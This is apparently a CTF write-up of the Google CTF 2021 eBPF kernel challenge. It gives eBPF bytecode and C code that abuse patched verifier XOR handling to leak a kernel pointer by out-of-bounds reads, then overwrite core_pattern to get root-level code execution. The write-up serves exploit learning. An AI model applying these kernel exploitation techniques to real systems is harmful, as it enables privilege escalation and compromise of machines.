For the challenge files go here: https://github.com/google/google-ctf/blob/master/2021/quals/pwn-ebpf/

This was a great kernel challenge and googleCTF is a great CTF overall.
I didn't manage to solve any of the challenges by the time of the competition.

They were two patches on the eBPF verifier so it will be an oob read/write.
When using "XOR" reg with an immediate it will make that reg type as scalar va-
lue (no bounds checking because it's considered not a pointer).
And when using "XOR" between two registers it will make the dst_reg as 
PTR_TO_MAP_VALUE which is great for oob access.
We will be using BPF_MAP_TYPE_ARRAY, as it is the easiest data structure and it 
will be easy for us to index things outside of the allowed range.

So now our primitive is that we can make any address we want as scalar value a-
nd make it pointer to map value using the patch (the introduced vulnerability).

First of all to get the leak, we will create a normal array map and then get
the pointer to map value index 0 (the first element).
		bpf_load_map(BPF_REG_1, map_fd),
                bpf_store_imm32(BPF_REG_10, -4, 0),
                bpf_mov_reg_reg(BPF_REG_2, BPF_REG_10),
                bpf_add_imm32(BPF_REG_2, -4),
                bpf_call(BPF_FUNC_map_lookup_elem),

Now we will make that pointer as scalar (the verifier will think that it is ju-
st a number not a pointer) like this:
		bpf_xor_imm32(BPF_REG_0, 0),

XORing it 0 will not change its value we only want the type change.
Now all left to do is to go out of bounds (back or forward) to look for a kern-
el address, in our case it's -0x110 it will hold a pointer to queue_map_ops.
                bpf_mov_reg_reg(BPF_REG_4, BPF_REG_0),
                bpf_mov_reg_reg(BPF_REG_5, BPF_REG_0),
                bpf_xor_reg(BPF_REG_4, BPF_REG_4),
                bpf_xor_imm32(BPF_REG_4, 0),
                bpf_add_imm32(BPF_REG_5, -0x110),
                bpf_xor_reg(BPF_REG_4, BPF_REG_5),

Now r4 contain a pointer to a kernel pointer (oob), all left to to is load it 
and take its value:
		bpf_load_reg64(BPF_REG_5, BPF_REG_4, 0),
	r5 = *(r4 + 0)

Now we put that kernel address (our leak) to index 0 of the array so we can re-
quest its value from userpace
		bpf_xor_imm32(BPF_REG_0, 0),
                bpf_store_reg64(BPF_REG_0, 0, BPF_REG_5),
	*(r0 + 0) = r5
	recall that r0 is pointer to the first element of the array.

Now we load the eBPF bytecode, waiting for verifier approval and if everything 
is good it will return a good fd. Then we create a socketpair and attach it to
that eBPF program, when doing write in the socket our eBPF will be executed and
we are sure that element 0 has a kernel address we take it by read_map.

	int progfd = load_prog(instructions, sizeof(instructions)/sizeof(instructions[0]));
        if(progfd < 0) {
                printf("Something went wrong!\n");
                exit(progfd);
        }

        int sockets[2];

        socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets);
        setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd));
        write(sockets[0], "MAHER", 5);

        unsigned long key = 0, value;

        uint64_t leak = read_map(map_fd);
        printf("The first element : %#lx\n", leak);
        unsigned long core_pattern = leak + 0x5c2a20;
	

Now we have a kernel leak and we can calculate the base address.
A nice cool trick that I wasn't aware of is to attack core_pattern (looks like
modprobbe_path attack) that we can use if modprobe_path wasn't an option.

We will do the same steps above but now for arbitraty write, we need to change
core_pattern path and make it "|/tmp/p\x00" and then crash the binary using 
	asm volatile("ud2");

GoogleCTF is a tough CTF I wasn't able to solve any last year and any this year
lol, hoping to solve 1 challenge next year xD

Challenge write-up by mem2019:
https://mem2019.github.io/jekyll/update/2021/07/19/GCTF2021-eBPF.html

